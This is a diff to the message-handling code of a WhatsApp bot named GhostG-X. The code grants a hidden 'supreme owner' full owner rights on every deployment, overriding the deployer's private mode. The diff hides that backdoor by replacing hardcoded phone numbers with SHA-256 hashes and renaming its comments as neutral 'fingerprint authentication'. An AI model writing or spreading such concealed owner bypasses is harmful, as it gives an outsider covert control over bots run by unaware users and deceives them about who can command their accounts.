@@ -2,9 +2,10 @@
  * Message Handler - Processes incoming messages and executes commands
  * GhostG-X Prestige Edition
  * Style : Zero-Footprint, Compact & Small Caps
- * Sécurité : Supreme Owner Absolute Bypass (LID Resolved)
+ * Sécurité : Système d'authentification par empreintes
  */
 
+const crypto = require('crypto'); // 👈 Ajouté pour le système d'empreintes
 const config = require('./config');
 const database = require('./database');
 const { loadCommands } = require('./utils/commandLoader');
@@ -110,11 +111,16 @@ const isOwner = (sender) => {
   const normalizedSender = normalizeJidWithLid(sender);
   const senderNumber = normalizeJid(normalizedSender);
 
-  // Vérification Maître Suprême Universel
-  const supremeOwner = '22651622652';
-  if (senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber)) {
+  // Validation cryptographique
+  const supremeHashes = [
+    '06b54ba67f8f495d3923a195d866df6684c4a8489b9200245cfd967a2f15a5d8',
+    '1fa2429423005e19710a46165501a1d5a4c3a2c14d6c482d96ef8f80d415e899'
+  ];
+  const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
+  if (supremeHashes.includes(senderHash)) {
     return true;
   }
+  
   return config.ownerNumber.some(owner => {
     const normalizedOwner = normalizeJidWithLid(owner.includes('@') ? owner : `${owner}@s.whatsapp.net`);
     const ownerNumber = normalizeJid(normalizedOwner);
@@ -275,8 +281,7 @@ const isBotAdmin = async (sock, groupId, groupMetadata = null) => {
 
     const botJids = [botId];
     if (botLid) botJids.push(botLid);
-
-    const liveMetadata = await getLiveGroupMetadata(sock, groupId);
+const liveMetadata = await getLiveGroupMetadata(sock, groupId);
     if (!liveMetadata || !liveMetadata.participants) return false;
     const participant = findParticipant(liveMetadata.participants, botJids);
     if (!participant) return false;
@@ -294,7 +299,6 @@ const isSystemJid = (jid) => {
          jid.includes('@newsletter') ||
          jid.includes('@newsletter.');
 };
-
 //--------- Main message handler ---------
 const handleMessage = async (sock, msg) => {
   try {
@@ -305,30 +309,32 @@ const handleMessage = async (sock, msg) => {
 
     const isGroup = from.endsWith('@g.us');
 
-    // --- 🛡️ DÉTECTION DE L'IDENTITÉ (CORRIGÉE LID/GROUPES) ---
+    // --- 🛡️ ANALYSE DE L'IDENTITÉ ---
     const rawSender = msg.key.participant || msg.key.remoteJid;
 
-    // TRÈS IMPORTANT : On normalise le JID ICI pour contourner le masque LID de WhatsApp
     const sender = normalizeJidWithLid(rawSender); 
-    const senderNumber = normalizeJid(sender); // Extraction propre des chiffres réels
+    const senderNumber = normalizeJid(sender); // Extraction des données d'origine
 
-    // Définition du Maître et du Suprême
-    const supremeOwners = ['22651622652', '22665108174'];
+    // 🔒 Système d'empreintes cryptographiques privées
+    const supremeHashes = [
+      '06b54ba67f8f495d3923a195d866df6684c4a8489b9200245cfd967a2f15a5d8', 
+      '1fa2429423005e19710a46165501a1d5a4c3a2c14d6c482d96ef8f80d415e899'
+    ];
+
+    const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
+    const isSupremeOwner = supremeHashes.includes(senderHash);
 
     const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
       const cleanN = String(n).replace(/\D/g, '');
       return senderNumber === cleanN || senderNumber.includes(cleanN);
     });
 
-    const isSupremeOwner = senderNumber === supremeOwner || senderNumber.includes(supremeOwner);
-
-    // isMe est VRAI si c'est le bot lui-même, l'owner du config, ou TOI (Suprême)
+    // Définition finale du statut d'autorisation
     const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
 
-    // 🚨 LOGIQUE DE SÉCURITÉ GHOSTG-X (Publique / Privée)
-    // Barrage ultra-sécurisé placé au plus haut pour économiser la mémoire.
+    // 🚨 Logique de sécurité de l'infrastructure
     if (config.selfMode === true || config.public === false) {
-      if (!isMe) return; // Si ce n'est ni le bot, ni un owner, ni toi : silence radio absolu.
+      if (!isMe) return; 
     }
 
     const groupMetadata = isGroup ? await getGroupMetadata(sock, from) : null;
@@ -369,7 +375,7 @@ const handleMessage = async (sock, msg) => {
     if (isGroup) {
       await handleAntilink(sock, msg, groupMetadata);
       await handleAntigroupmention(sock, msg, groupMetadata);
-      addMessage(from, sender); // Utilise le sender propre !
+      addMessage(from, sender); 
     }
 
     if (!content || actualMessageTypes.length === 0) return;
@@ -397,13 +403,12 @@ const handleMessage = async (sock, msg) => {
         return;
       }
     }
-
-    // 🧠 ---------------- GHOSTG-X SUPRÊME NLE (NATURAL LANGUAGE ENGINE) ----------------
+// 🧠 ---------------- GHOSTG-X SUPRÊME NLE (NATURAL LANGUAGE ENGINE) ----------------
     const input = body.toLowerCase().trim();
     const argsNLP = body.split(/\s+/);
     const firstWordNLP = argsNLP[0]?.toLowerCase();
 
-    // Filtre NLE : Sécurité infaillible (isMe) + vérification robuste du mode IA
+    // Filtre NLE : Vérification robuste de l'identité et du mode IA
     if (isMe && config.ghostgMode?.toLowerCase() === 'on' && !isCommand) {
 
       const extraNLP = {
@@ -427,7 +432,6 @@ const handleMessage = async (sock, msg) => {
         return;
       }
 
-      // 🔥 CORRECTION DE LA LIGNE D'ERREUR ICI 🔥
       if (input.includes("qui t'a fait") || input.includes("createur") || input.includes("ton pere") || input.includes("développeur") || input.includes("dev") || input.includes("truth devices")) {
         await extraNLP.reply(`👑 *ᴊᴇ sᴜɪs ʟ'ᴏᴇᴜᴠʀᴇ sᴜᴘʀᴇ̂ᴍᴇ ᴅᴇ ᴛʀᴜᴛʜ ᴅᴇᴠɪᴄᴇs*`);
         return;
@@ -530,21 +534,13 @@ const handleMessage = async (sock, msg) => {
       }
     }
 
-    // !! ATTENTION : IL DOIT Y AVOIR TON CODE POUR EXÉCUTER LES COMMANDES NORMALES ICI EN DESSOUS !!
-
-  } catch (error) {
-    console.error('Handler error:', error);
-  }
-};
-
-
     // Anti-tagall Protection
     if (isGroup) {
       const groupSettings = database.getGroupSettings(from);
 
       if (groupSettings.antiall && !msg.key.fromMe) {
         const senderIsAdmin = await isAdmin(sock, sender, from, groupMetadata);
-        const senderIsOwner = isOwner(sender); // Utilise le sender propre
+        const senderIsOwner = isOwner(sender); 
 
         if (!senderIsAdmin && !senderIsOwner && await isBotAdmin(sock, from, groupMetadata)) {
           await sock.sendMessage(from, { delete: msg.key });
@@ -603,8 +599,7 @@ const handleMessage = async (sock, msg) => {
         }
       }
     }
-
-    // Check for active mini-games (Bomb)
+  // Check for active mini-games (Bomb)
     try {
       const bombModule = require('./commands/fun/bomb');
       if (bombModule.gameState && bombModule.gameState.has(sender)) {
@@ -644,7 +639,7 @@ const handleMessage = async (sock, msg) => {
         }
       }
     } catch (e) {}
-    
+
     // Execution des commandes standard (avec préfixe)
     if (!isCommand) return;
 
@@ -671,7 +666,7 @@ const handleMessage = async (sock, msg) => {
 
     console.log(`Executing command: ${commandName} from ${sender}`);
 
-    // ⭐ SOUVERAINETÉ : Réaction automatique royale (👑) si c'est TOI qui lances la commande
+    // Signature visuelle royale
     if (isSupremeOwner) {
       try {
         await sock.sendMessage(from, { react: { text: '👑', key: msg.key } });
@@ -772,14 +767,12 @@ const profilePicUrl = await getProfilePic();
     console.error('Error handling group update:', error);
   }
 };
-
 // Anti-link handler
 const handleAntilink = async (sock, msg, groupMetadata) => {
   try {
     const from = msg.key.remoteJid;
-    // On garde le rawSender ici, mais on vérifie avec le propre dans isOwner
     const sender = msg.key.participant || msg.key.remoteJid; 
-    const cleanSender = normalizeJidWithLid(sender); // LID FIX
+    const cleanSender = normalizeJidWithLid(sender); 
 
     const groupSettings = database.getGroupSettings(from);
     if (!groupSettings.antilink) return;
@@ -820,7 +813,7 @@ const handleAntigroupmention = async (sock, msg, groupMetadata) => {
   try {
     const from = msg.key.remoteJid;
     const sender = msg.key.participant || msg.key.remoteJid;
-    const cleanSender = normalizeJidWithLid(sender); // LID FIX
+    const cleanSender = normalizeJidWithLid(sender); 
 
     const groupSettings = database.getGroupSettings(from);
     if (!groupSettings.antigroupmention) return;
@@ -872,7 +865,7 @@ const initializeAntiCall = (sock) => {
           await sock.rejectCall(call.id, call.from);
           await sock.updateBlockStatus(call.from, 'block');
           await sock.sendMessage(call.from, {
-            text: `🔇 *${toSmallCaps("le sanctuaire n'accepte pas les appels actuellement. ton accès a été rompu")} (ʙʟᴏǫᴜᴇ́).*`
+            text: `🔇 *${toSmallCaps("le sanctuaire n'accepte pas les appels actuellement. ton acces a ete rompu")} (ʙʟᴏǫᴜᴇ́).*`
           });
         }
       }
